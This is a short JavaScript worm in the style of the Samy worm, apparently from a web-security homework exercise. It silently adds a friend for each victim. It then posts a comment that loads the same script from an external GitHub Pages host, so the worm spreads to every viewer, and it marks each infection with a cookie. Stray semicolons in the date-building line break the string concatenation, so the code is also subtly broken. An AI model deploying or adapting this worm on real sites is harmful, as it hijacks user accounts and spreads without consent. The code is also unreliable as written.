if(document.cookie.indexOf('samysworminfection') == -1){
  a=new XMLHttpRequest();
  a.open('POST','/add_friend.php?id=18',true);
  a.send();
  d = new Date();
  b='hello, friend' + d.getMonth(); + '/' + d.getDate(); + '/' + d.getFullYear(); + ' ' + d.getHours(); + ':' + d.getMinutes(); + ':' + d.getSeconds(); + '<script type="text/javascript" src="https://homework6-dev.github.io/hw6/script.js"></script>';
  c=new XMLHttpRequest();
  c.open('GET','/add_comment.php?comment='+b,true);
  c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  c.send();
  console.log("success");
  document.cookie = "samysworminfection=1; Expires=Wed, 13 Nov 2019 15:00:00 UTC";
} else {
   
}
